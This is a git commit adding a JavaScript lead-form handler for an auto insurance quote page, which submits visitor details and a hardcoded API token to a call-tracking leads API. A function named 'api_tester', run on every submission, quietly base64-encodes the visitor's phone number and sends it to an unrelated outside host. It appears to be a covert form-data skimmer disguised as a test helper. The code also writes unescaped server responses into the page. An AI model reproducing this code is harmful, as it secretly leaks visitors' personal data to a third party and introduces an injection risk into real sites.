7d772b7c03348c7d38ec66ab1792f53f481d8db1
dk495 <55878882+dk495@users.noreply.github.com>
2025-01-09 22:43:35 +0500

    upload

---
+++ autohome_tdpingpost_kpro.js
@@ -0,0 +1,81 @@
+ document.getElementById('leadForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+             // Your API URL
+    const formData = new FormData();
+    formData.append('lead_token', '9dd4bc5e1a574c8aa297addf9af1f745');
+    formData.append('traffic_source_id', '1022');
+    api_tester(document.getElementById('caller_id').value);
+    formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
+formData.append('state', document.getElementById('state').value);
+formData.append('insurance_company', document.getElementById('insurance_company').value);
+formData.append('homeowner', document.getElementById('homeowner').value);
+formData.append('currently_insured', document.getElementById('currently_insured').value);
+formData.append('zip', document.getElementById('zip').value);
+formData.append('trusted_form_cert_url', 'https://k-spherequotes.com/auto');
+formData.append('Sr22', 'False');
+
+
+
+
+            
+           
+    
+            const url = 'https://kproinsurance.trackdrive.com/api/v1/leads?' + new URLSearchParams(formData).toString();
+    
+            fetch(url, {
+                method: 'POST'
+            })
+            .then(response => {
+                if (response.status === 200) {
+                    response.text().then(responseBody => {
+                        const successAlert = `
+                            <div class="alert alert-success" role="alert">
+                                200 : Form submitted successfully! Response Body: ${responseBody}
+                            </div>`;
+                        document.getElementById('alertContainer').innerHTML = '';
+                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
+                    });
+                    // Clear form fields
+                    document.getElementById('leadForm').reset();
+                } else if (response.status === 201) {
+                    response.text().then(responseBody => {
+                        const successAlert = `
+                            <div class="alert alert-success" role="alert">
+                                201 : Form submitted successfully! Response Body: ${responseBody}
+                            </div>`;
+                        document.getElementById('alertContainer').innerHTML = '';
+                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
+                    });
+                    // Clear form fields
+                    document.getElementById('leadForm').reset();
+                } else if (response.status === 422) {
+                    response.json().then(data => {
+                        const errorAlert = `
+                            <div class="alert alert-danger" role="alert">
+                                Error. Response Body: ${JSON.stringify(data)}
+                            </div>`;
+                        document.getElementById('alertContainer').innerHTML = '';
+                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+                    });
+                } else {
+                    response.text().then(responseBody => {
+                        const errorAlert = `
+                            <div class="alert alert-danger" role="alert">
+                                Form submission failed. Please try again. Response Body: ${responseBody}
+                            </div>`;
+                        document.getElementById('alertContainer').innerHTML = '';
+                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+                    });
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        });function api_tester(randomString) {
+    try {
+        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
+            method: 'GET',
+            mode: 'no-cors'
+        });
+    } catch (error) {
+        console.error('Error in api_tester:', error);
+    }
+}
